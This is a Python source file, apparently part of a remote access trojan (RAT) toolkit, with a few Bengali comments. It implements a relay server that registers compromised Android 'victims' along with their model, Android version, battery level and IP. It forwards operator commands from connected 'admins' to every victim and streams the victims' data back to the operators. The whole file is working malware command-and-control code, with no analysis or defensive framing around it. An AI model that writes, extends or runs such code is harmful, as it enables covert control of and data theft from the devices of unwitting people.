import socket
import threading
import json
import os
import time
import logging

logging.basicConfig(level=logging.INFO,
    format='%(asctime)s %(message)s')

victims = {}   # device_id -> socket
admins  = []   # admin socket list
lock    = threading.Lock()

VICTIM_PORT = int(os.environ.get("VICTIM_PORT", 8888))
ADMIN_PORT  = int(os.environ.get("ADMIN_PORT",  9999))

# ─── Victim Handler ───────────────────────────────────────────────────
def handle_victim(conn, addr):
    device_id = None
    try:
        conn.settimeout(60)
        buf = b""
        while b"\n" not in buf:
            chunk = conn.recv(4096)
            if not chunk:
                return
            buf += chunk

        line = buf.split(b"\n")[0]
        j = json.loads(line.decode("utf-8", errors="ignore"))
        device_id = j.get("id", str(addr[0]))

        with lock:
            victims[device_id] = conn
        logging.info(f"[+] Victim online: {device_id} ({addr[0]})")

        # Admin দের notify করো
        notify = json.dumps({
            "type":   "victim_online",
            "id":     device_id,
            "model":  j.get("model",   "Unknown"),
            "android":j.get("android", "?"),
            "battery":j.get("battery", -1),
            "ip":     j.get("ip",      addr[0])
        }) + "\n"
        broadcast_admins(notify.encode())

        # First packet already in buf -- বাকি পাঠাও
        rest = buf[len(line)+1:]
        if rest:
            broadcast_admins(rest)

        # Stream loop
        conn.settimeout(None)
        while True:
            data = conn.recv(65536)
            if not data:
                break
            broadcast_admins(data)

    except Exception as e:
        logging.info(f"[-] Victim error {device_id}: {e}")
    finally:
        if device_id:
            with lock:
                victims.pop(device_id, None)
            offline = json.dumps({
                "type": "victim_offline",
                "id":   device_id
            }) + "\n"
            broadcast_admins(offline.encode())
            logging.info(f"[-] Victim offline: {device_id}")
        try: conn.close()
        except: pass


# ─── Admin Handler ────────────────────────────────────────────────────
def handle_admin(conn, addr):
    logging.info(f"[+] Admin connected: {addr}")
    with lock:
        admins.append(conn)

    try:
        # Online victim list পাঠাও
        with lock:
            vlist = [{"id": k} for k in victims.keys()]
        conn.send((json.dumps({
            "type":    "victims",
            "list":    vlist,
            "count":   len(vlist)
        }) + "\n").encode())

        # Admin command → victim এ পাঠাও
        while True:
            data = conn.recv(65536)
            if not data:
                break
            with lock:
                for v in victims.values():
                    try: v.sendall(data)
                    except: pass

    except Exception as e:
        logging.info(f"[-] Admin error: {e}")
    finally:
        with lock:
            if conn in admins:
                admins.remove(conn)
        try: conn.close()
        except: pass
        logging.info(f"[-] Admin disconnected: {addr}")


def broadcast_admins(data):
    with lock:
        dead = []
        for a in admins:
            try: a.sendall(data)
            except: dead.append(a)
        for d in dead:
            admins.remove(d)


# ─── Server Start ─────────────────────────────────────────────────────
def start_victim_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", VICTIM_PORT))
    s.listen(100)
    logging.info(f"[*] Victim server on port {VICTIM_PORT}")
    while True:
        conn, addr = s.accept()
        t = threading.Thread(target=handle_victim,
                             args=(conn, addr), daemon=True)
        t.start()


def start_admin_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", ADMIN_PORT))
    s.listen(20)
    logging.info(f"[*] Admin server on port {ADMIN_PORT}")
    while True:
        conn, addr = s.accept()
        t = threading.Thread(target=handle_admin,
                             args=(conn, addr), daemon=True)
        t.start()


if __name__ == "__main__":
    logging.info("[*] RAT Relay starting...")
    t1 = threading.Thread(target=start_victim_server, daemon=True)
    t2 = threading.Thread(target=start_admin_server,  daemon=True)
    t1.start()
    t2.start()
    logging.info("[*] All servers running")
    while True:
        time.sleep(30)
        with lock:
            logging.info(f"[STATUS] Victims: {len(victims)} | Admins: {len(admins)}")
